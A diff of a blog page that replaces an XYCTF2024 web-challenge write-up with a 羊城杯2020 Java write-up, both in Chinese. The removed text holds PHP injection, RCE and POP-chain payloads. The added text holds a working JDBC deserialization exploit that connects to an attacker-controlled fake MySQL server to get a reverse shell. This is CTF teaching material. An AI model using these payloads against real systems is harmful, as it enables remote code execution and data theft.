@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>XYCTF2024 | 甜筒园</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="XYCTF2024 | 甜筒园">
+  <title>羊城杯2020 a_piece_of_java | 甜筒园</title>
+  <meta name="keywords" content=" Java安全 ">
+  <meta name="description" content="羊城杯2020 a_piece_of_java | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="反编译jar包后观察路由： @PostMapping(&amp;#123;&quot;&#x2F;index&quot;&amp;#125;)     public String index(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, HttpServlet">
 <meta property="og:type" content="article">
@@ -642,9 +642,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-XYCTF" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-羊城杯2020-a_piece_of_java" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">XYCTF2024</h1>
+        <h1 class="article-title">羊城杯2020 a_piece_of_java</h1>
     
     <div class="article-meta">
         
@@ -659,15 +659,22 @@
         </span>
         
         
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color2">Java安全</a>
+            
+        </span>
+        
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-05-09 16:16:40'>2024-04-28 14:40</time>
+            Created At : <time class="date" title='Updated At: 2024-11-12 17:46:24'>2024-11-12 17:46</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.8k</span>
+        <span>Count:989</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -697,7 +704,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezhttp"><span class="toc-text">ezhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmd5"><span class="toc-text">ezmd5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warm-up"><span class="toc-text">warm up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezPOP"><span class="toc-text">ezPOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezMake"><span class="toc-text">ezMake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-Make"><span class="toc-text">ez?Make</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-text">我是一个复读机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRCE"><span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSerialize"><span class="toc-text">ezSerialize</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -713,227 +720,220 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezhttp"><span class="toc-text">ezhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmd5"><span class="toc-text">ezmd5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warm-up"><span class="toc-text">warm up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezPOP"><span class="toc-text">ezPOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezMake"><span class="toc-text">ezMake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-Make"><span class="toc-text">ez?Make</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-text">我是一个复读机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRCE"><span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSerialize"><span class="toc-text">ezSerialize</span></a></li></ol></li></ol></div></p>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>F12看到有注释提示：</p>
-<p><strong><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407093914280.png" alt="image-20240407093914280"></strong></p>
-<p>访问<code>/robots.txt</code></p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407094427420.png" alt="image-20240407094427420"></p>
-<p>继续访问<code>/l0g1n.txt</code>,拿到用户名密码：</p>
-<pre><code>username: XYCTF
-password: @JOILha!wuigqi123$
-</code></pre>
-<p>然后就是一连串组合技，需要对http协议比较熟悉，抓包修改header头或者用hackbar：</p>
-<pre><code>POST /index.php HTTP/1.1
-Host: xyctf.top:48057
-Content-Length: 48
-Pragma: no-cache
-Cache-Control: no-cache
-DNT: 1
-Upgrade-Insecure-Requests: 1
-User-Agent: XYCTF
-Origin: http://xyctf.top:48057
-Content-Type: application/x-www-form-urlencoded
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: yuanshen.com
-Client-IP: 127.0.0.1
-Via: ymzx.qq.com
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ee;q=0.7
-Cookie: XYCTF
-Connection: close
+        <p>反编译jar包后观察路由：</p>
+<pre><code class="java">@PostMapping(&#123;&quot;/index&quot;&#125;)
+    public String index(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, HttpServletResponse response) &#123;
+        UserInfo userinfo = new UserInfo();
+        userinfo.setUsername(username);
+        userinfo.setPassword(password);
+        Cookie cookie = new Cookie(&quot;data&quot;, this.serialize(userinfo));
+        cookie.setMaxAge(2592000);
+        response.addCookie(cookie);
+        return &quot;redirect:/hello&quot;;
+    &#125;
 
-username=XYCTF&amp;password=%40JOILha%21wuigqi123%24
-</code></pre>
-<p>上述请求包依次对<code>Referer</code>,<code>User-Agent</code>,<code>Client-IP</code>,<code>Via</code>,<code>Cookie</code>进行修改，拿到flag</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407095632660.png" alt="image-20240407095632660"></p>
-<h3 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h3><p>题目要求上传两个图片，并进行比较，根据题目名称猜测是要求两张图片并不相同，但通过MD5比较相同，网上有大量的碰撞构造脚本，这里提供两张图片方便使用：</p>
-<p>图片1：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/barry.jpg" alt="barry"></p>
-<p>图片2：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/james.jpg" alt="james"></p>
-<p>上传后比较拿到flag</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407144417875.png" alt="image-20240407144417875"></p>
-<h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h3><p>题目给出源代码，第一个if可以通过数组绕过：</p>
-<pre><code>val1[]=1&amp;val2[]=2
-</code></pre>
-<p>第二个if,因为是<code>==</code>比较，可以找一个<code>0e</code>开头的字符串MD5加密后开头也是<code>0e</code>的来绕过：</p>
-<pre><code>md5=0e215962017
-</code></pre>
-<p>第三个if同第二个if,这里要注意extract函数的用法，可以对变量<code>XYCTF</code>的值进行覆盖：</p>
-<pre><code>XYCTF=0e215962017&amp;XY=0e215962017
-</code></pre>
-<p>第一关完整payload:</p>
-<pre><code>GET /?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XYCTF=0e215962017&amp;XY=0e215962017
-</code></pre>
-<p>拿到第二关地址：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407145204544.png" alt="image-20240407145204544"></p>
-<p>第二关是个简单的preg_replace <code>\e</code>模式RCE利用，网上payload满天飞，学习之前建议先熟悉一下正则表达式</p>
-<p>第二关完整payload:</p>
-<pre><code>POST  /LLeeevvveeelll222.php?a=/(.*)/ies&amp;b=\1&amp;c=`cat /f*`
+    @GetMapping(&#123;&quot;/hello&quot;&#125;)
+    public String hello(@CookieValue(value = &quot;data&quot;,required = false) String cookieData, Model model) &#123;
+        if (cookieData != null &amp;&amp; !cookieData.equals(&quot;&quot;)) &#123;
+            Info info = (Info)this.deserialize(cookieData);
+            if (info != null) &#123;
+                model.addAttribute(&quot;info&quot;, info.getAllInfo());
+            &#125;
 
-a[]=1
+            return &quot;hello&quot;;
+        &#125; else &#123;
+            return &quot;redirect:/index&quot;;
+        &#125;
+    &#125;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407145712408.png" alt="image-20240407145712408"></p>
-<h3 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h3><p>这题还是比较有难度的，这里只列出payload不做具体讲解，想深入了解的可私聊我发你好康的学习资料</p>
-<p>首先是简单的反序列化构造，利用数组绕过throw异常抛出：</p>
-<pre><code class="php">&lt;?php
-$c=new CCC();
-$a=new AAA();
-$b=new BBB();
-$a-&gt;s=$b;
-$a-&gt;a=&quot;ttycp3&quot;;
-$c-&gt;c=$a;
-echo serialize(array($c,null));
-</code></pre>
-<p>拿到序列化链：</p>
-<pre><code>a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;system&quot;;s:1:&quot;d&quot;;s:7:&quot;cat /f*&quot;;&#125;s:1:&quot;a&quot;;s:6:&quot;ttycp3&quot;;&#125;&#125;i:1;N;&#125;
-</code></pre>
-<p>把最后一位的1改成0：</p>
-<pre><code>a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;system&quot;;s:1:&quot;d&quot;;s:7:&quot;cat /f*&quot;;&#125;s:1:&quot;a&quot;;s:6:&quot;ttycp3&quot;;&#125;&#125;i:0;N;&#125;
-</code></pre>
-<p>然后再利用一个PHP原生类构成完整payload:</p>
-<pre><code>POST /?xy=a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;system&quot;;s:1:&quot;d&quot;;s:7:&quot;cat /f*&quot;;&#125;s:1:&quot;a&quot;;s:6:&quot;ttycp3&quot;;&#125;&#125;i:0;N;&#125;
+<p>通过<code>/index</code>路由注册一个cookie，再进入<code>/hello</code>路由中通过<code>deserialize</code>函数对cookie进行反序列化，相关函数如下：</p>
+<pre><code class="JAVA">    private Object deserialize(String base64data) &#123;
+        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));
 
-a=Closure::fromCallable&amp;0=Closure&amp;1=fromCallable
+        try &#123;
+            ObjectInputStream ois = new SerialKiller(bais, &quot;serialkiller.conf&quot;);
+            Object obj = ois.readObject();
+            ois.close();
+            return obj;
+        &#125; catch (Exception var5) &#123;
+            Exception e = var5;
+            e.printStackTrace();
+            return null;
+        &#125;
+    &#125;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407151149503.png" alt="image-20240407151149503"></p>
-<p>引用某位师傅的解释：</p>
-<pre><code>利用 PHP原生类静态方法Closure::fromCallable，然后再以数组作为参数二次调用，这样经过call_user_func($a, $b) 以后，就形成了一个Closure ,它加载第一个参数（$c），就变成了以那个参数命名的函数，例如system。然后再加载第二个参数（$d）就变成了system函数的参数。
-</code></pre>
-<h3 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h3><p>这个需要学一下makefile的语法，这里借用一下变量shell拿到flag内容：</p>
-<p>payload1</p>
-<pre><code>$(SHELL)  flag
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407154248240.png" alt="image-20240407154248240"></p>
-<p>受王师傅启发，可以用echo写文件，所以我们也可以这样解：</p>
-<p>payload2</p>
-<pre><code>echo &#39;&lt;?=`cat flag`?&gt;&#39; &gt; 1.php
-</code></pre>
-<p>访问<code>1.php</code>拿到flag</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240411103549195.png" alt="image-20240411103549195"></p>
-<h3 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h3><p>这个就是个简单的命令执行，只不过过滤了<code>flag</code>四个字母外加<code>.?@$;/</code>等等字符，这里提供一种绕过方式：</p>
-<p>利用cd切换到根目录，利用管道符进行多次命令执行，再用more命令读取文件，用中括号匹配的方式绕过字母过滤</p>
-<pre><code>cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [e-h][k-m][!e][e-h]
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407161339160.png" alt="image-20240407161339160"></p>
-<h3 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h3><p>题目告诉了用户名还给了弱密码字典，直接爆找到密码：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407162003987.png" alt="image-20240407162003987"></p>
-<p>简单试了两下，再看一眼题目环境是flask，是SSTI模板注入没错了</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407162240167.png" alt="image-20240407162240167"></p>
-<p>过滤的有点狠，偶然发现可以这样执行<code>config</code></p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240407171656767.png" alt="image-20240407171656767"></p>
-<p>未完待续。。。</p>
-<h3 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h3><p>限制只能用数字和一些字符，留了<code>$</code>和<code>\</code>很容易想到考察的是八进制RCE,构造payload：</p>
-<pre><code>cat /flag
-</code></pre>
-<p>八进制编码后为：</p>
-<pre><code>$&#39;\143\141\164&#39; $&#39;\57\146\154\141\147&#39;
-</code></pre>
-<p>因为空格不让使，可以用<code>&lt;</code>代替，最终payload：</p>
-<pre><code>GET /?cmd=$&#39;\143\141\164&#39;&lt;$&#39;\57\146\154\141\147&#39;
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240408172751357.png" alt="image-20240408172751357"></p>
-<h3 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h3><p>第一关利用取址符号让token和password相等就好：</p>
-<pre><code class="php">&lt;?php
-class Flag &#123;
-    public $token;
-    public $password;
+<p>来看导入了哪些第三方依赖：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241112110722088.png" alt="image-20241112110722088"></p>
+<p><code>commons-collections</code>、<code>jackson</code>、<code>log4j</code>、<code>spring-boot</code>都有，但是又有白名单输入流限制：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- serialkiller.conf --&gt;
+&lt;config&gt;
+    &lt;refresh&gt;6000&lt;/refresh&gt;
+    &lt;mode&gt;
+        &lt;!-- set to &#39;false&#39; for blocking mode --&gt;
+        &lt;profiling&gt;false&lt;/profiling&gt;
+    &lt;/mode&gt;
+    &lt;blacklist&gt;
 
-    public function __construct($a)
-    &#123;
-        $this-&gt;token = $a;
-        $this-&gt;password = &amp;$this-&gt;token;
+    &lt;/blacklist&gt;
+    &lt;whitelist&gt;
+        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;
+        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;
+    &lt;/whitelist&gt;
+&lt;/config&gt;
+</code></pre>
+<p>只能使用这两个包的内容。查看gdufs中有一个重写的<code>InfoInvocationHandler</code>:</p>
+<pre><code class="java">package gdufs.challenge.web.invocation;
+
+import gdufs.challenge.web.model.Info;
+import java.io.Serializable;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+
+public class InfoInvocationHandler implements InvocationHandler, Serializable &#123;
+    private Info info;
+
+    public InfoInvocationHandler(Info info) &#123;
+        this.info = info;
+    &#125;
+
+    public Object invoke(Object proxy, Method method, Object[] args) &#123;
+        try &#123;
+            return method.getName().equals(&quot;getAllInfo&quot;) &amp;&amp; !this.info.checkAllInfo() ? null : method.invoke(this.info, args);
+        &#125; catch (Exception var5) &#123;
+            Exception e = var5;
+            e.printStackTrace();
+            return null;
+        &#125;
     &#125;
 &#125;
-$f=new Flag(md5(mt_rand()));
-echo serialize($f);
 </code></pre>
-<p>拿到序列化字符串：</p>
-<pre><code>O:4:&quot;Flag&quot;:2:&#123;s:5:&quot;token&quot;;s:32:&quot;a72f672fbda7ad4ee7710a53b1c55e59&quot;;s:8:&quot;password&quot;;R:2;&#125;
+<p>还有一个<code>DatabaseInfo</code>:</p>
+<pre><code class="java">public class DatabaseInfo implements Serializable, Info &#123;
+    private String host;
+    private String port;
+    private String username;
+    private String password;
+    private Connection connection;
+
+    public DatabaseInfo() &#123;
+    &#125;
+
+    public void setHost(String host) &#123;
+        this.host = host;
+    &#125;
+
+    public void setPort(String port) &#123;
+        this.port = port;
+    &#125;
+
+    public void setUsername(String username) &#123;
+        this.username = username;
+    &#125;
+
+    public void setPassword(String password) &#123;
+        this.password = password;
+    &#125;
+
+    public String getHost() &#123;
+        return this.host;
+    &#125;
+
+    public String getPort() &#123;
+        return this.port;
+    &#125;
+
+    public String getUsername() &#123;
+        return this.username;
+    &#125;
+
+    public String getPassword() &#123;
+        return this.password;
+    &#125;
+
+    public Connection getConnection() &#123;
+        if (this.connection == null) &#123;
+            this.connect();
+        &#125;
+
+        return this.connection;
+    &#125;
+
+    private void connect() &#123;
+        String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;;
+
+        try &#123;
+            this.connection = DriverManager.getConnection(url);
+        &#125; catch (Exception var3) &#123;
+            Exception e = var3;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+
+    public Boolean checkAllInfo() &#123;
+        if (this.host != null &amp;&amp; this.port != null &amp;&amp; this.username != null &amp;&amp; this.password != null) &#123;
+            if (this.connection == null) &#123;
+                this.connect();
+            &#125;
+
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+
+    public String getAllInfo() &#123;
+        return &quot;Here is the configuration of database, host is &quot; + this.host + &quot;, port is &quot; + this.port + &quot;, username is &quot; + this.username + &quot;, password is &quot; + this.password + &quot;.&quot;;
+    &#125;
+&#125;
 </code></pre>
-<p>GET传参拿到第二关地址<code>/fpclosefpclosefpcloseffflllaaaggg.php</code>：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240409093342644.png" alt="image-20240409093342644"></p>
-<p>第二关属实是套起来了，不过都是很简单的构造，这里列出调用栈：</p>
-<pre><code>E::__weakup()--&gt;D::__toString()--&gt;B::__get()--&gt;A::__invoke()--&gt;C::__call()
+<p>很明显打的是JDBC反序列化，构造EXP:</p>
+<pre><code class="JAVA">package gdufs.challenge.web;
+
+import gdufs.challenge.web.invocation.InfoInvocationHandler;
+import gdufs.challenge.web.model.DatabaseInfo;
+import gdufs.challenge.web.model.Info;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+
+public class exp &#123;
+    public static void main(String[] args) throws IOException &#123;
+        //设置好DatabaseInfo类的相关属性以实现jdbc反序列化
+        DatabaseInfo databaseInfo = new DatabaseInfo();
+        databaseInfo.setHost(&quot;XX.XX.XX.XX&quot;);
+        databaseInfo.setPort(&quot;3309&quot;);
+        databaseInfo.setUsername(&quot;uddbebf&quot;);
+        databaseInfo.setPassword(&quot;uddbebf&amp;allowLoadLocalInfile=true&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;);//构造JDBC字符串拼接，开启autoDeserialize，queryInterceptors触发反序列化。
+
+        //将DataBaseInfo实例，封装进Proxy类 使用动态代理
+        ClassLoader classLoader = databaseInfo.getClass().getClassLoader();
+        Class[] interfaces = databaseInfo.getClass().getInterfaces();
+        //使用InfoInvocationHandler的invoke方法触发databaseInfo的connect方法
+        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
+        Info proxy = (Info) Proxy.newProxyInstance(classLoader,interfaces,infoInvocationHandler);
+        //输出反序列化字符串
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(proxy);
+        oos.flush();
+        oos.close();
+        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
+    &#125;
+&#125;
 </code></pre>
-<p>构造脚本：</p>
-<pre><code class="php">&lt;?php
-class A &#123;
-    public $mack; 
-&#125;
-
-class B &#123;
-    public $luo;
-&#125;
-
-class C &#123;
-    public $wang1;
-&#125;
-
-
-class D &#123;
-    public $lao;
-    public $chen=&quot;ttycp3&quot;;
-&#125;
-
-class E &#123;
-    public $name;
-    public $num;
-&#125;
-$e=new E();
-$c=new C();
-$d=new D();
-$b=new B();
-$a=new A();
-$a-&gt;mack=$c;
-$b-&gt;luo=$a;
-$d-&gt;lao=$b;
-$e-&gt;name=$d;
-echo serialize($e);
-</code></pre>
-<p>传入pop链拿到第三关地址<code>saber_master_saber_master.php</code>：</p>
-<pre><code>POST /fpclosefpclosefpcloseffflllaaaggg.php
-
-pop=O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;s:6:&quot;ttycp3&quot;;&#125;s:3:&quot;num&quot;;N;&#125;
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240410145152914.png" alt="image-20240410145152914"></p>
-<p>这一关的pop链构造也没什么难度，要什么值给什么值就好了，脚本如下：</p>
-<pre><code class="php">&lt;?php
-class XYCTFNO1
-&#123;
-    private $upsw1ng;
-    public $crypto0=&#39;dev1l&#39;;
-    public $T1ng=&#39;yuroandCMD258&#39;;
-    public $Liu;
-&#125;
-
-class XYCTFNO2
-&#123;
-    public $crypto0;
-    public $adwa;
-&#125;
-
-class XYCTFNO3
-&#123;
-    public $KickyMu;
-    public $fpclose;
-    public $N1ght = &quot;oSthing&quot;;
-&#125;
-$n1=new XYCTFNO1();
-$n2=new XYCTFNO2();
-$n3=new XYCTFNO3();
-$n2-&gt;adwa=$n1;
-$n3-&gt;KickyMu=$n2;
-echo urlencode(serialize($n3));
-</code></pre>
-<p>这里要注意有私有变量，有不可见字符需要url编码一下，再利用原生类<code>SplFileObject</code>和伪协议读取<code>flag.php</code></p>
-<pre><code>POST /saber_master_saber_master.php?CTF=O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A3%3A%22Liu%22%3BN%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D
-
-X=SplFileObject&amp;Y=php://filter/convert.base64-encode/resource=saber_master_saber_master.php
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240410151743029.png" alt="image-20240410151743029"></p>
-<p>拿到flag,结束套娃之旅</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240410152100153.png" alt="image-20240410152100153"></p>
+<p>这里使用工具web-chains启动fake-mysql服务：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241112173904158.png" alt="image-20241112173904158"></p>
+<p>随便选择一条存在漏洞的第三方库的链子即可：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241112174008338.png" alt="image-20241112174008338"></p>
+<p>将生成的username填入上面的EXP中，生成base64字符串拿去<code>/hello</code>路由下触发反序列化：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241112174224603.png" alt="image-20241112174224603"></p>
+<p>成功触发反弹shell，拿到flag：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241112174304622.png" alt="image-20241112174304622"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
